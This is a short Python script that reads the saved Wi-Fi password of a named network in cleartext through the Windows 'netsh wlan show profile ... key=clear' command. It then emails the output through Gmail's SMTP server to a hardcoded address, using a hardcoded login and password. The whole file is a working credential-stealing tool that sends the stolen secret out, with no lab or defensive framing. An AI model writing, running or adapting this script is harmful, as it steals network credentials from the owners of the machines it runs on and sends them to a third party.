#!/usr/bin/env python

import subprocess, smtplib

def send_email(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile INFINITUM5CA2_2.4 key=clear"
result = subprocess.check_output(command, shell=True)
send_email("johnwickend29@gmail.com", "123abc1234abc", result)

